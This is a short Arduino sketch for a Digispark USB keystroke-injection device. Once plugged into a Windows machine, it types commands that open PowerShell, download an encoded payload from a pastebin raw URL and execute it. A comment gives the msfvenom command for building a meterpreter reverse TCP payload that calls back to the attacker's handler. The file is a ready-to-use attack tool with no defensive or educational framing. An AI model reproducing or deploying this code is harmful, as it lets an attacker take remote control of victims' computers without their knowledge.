#include "DigiKeyboard.h"

#define KEY_ENTER       40
#define KEY_DELETE      76

void setup() {
  DigiKeyboard.update();
}


void loop() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.update();
  DigiKeyboard.delay(100);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_DELETE);
  DigiKeyboard.delay(50);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  // msfvenom -p windows/meterpreter/reverse_tcp LHOST=<handler/YOUR ip> LPORT=4444 -f psh-cmd –smallest
  DigiKeyboard.print("$url = 'pastebin.com/raw/<msfvenom_payload>'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.print("$result = Invoke-WebRequest -Uri $url");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.print("powershell.exe -nop -e $result.content");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);

  DigiKeyboard.delay(90000000);
}
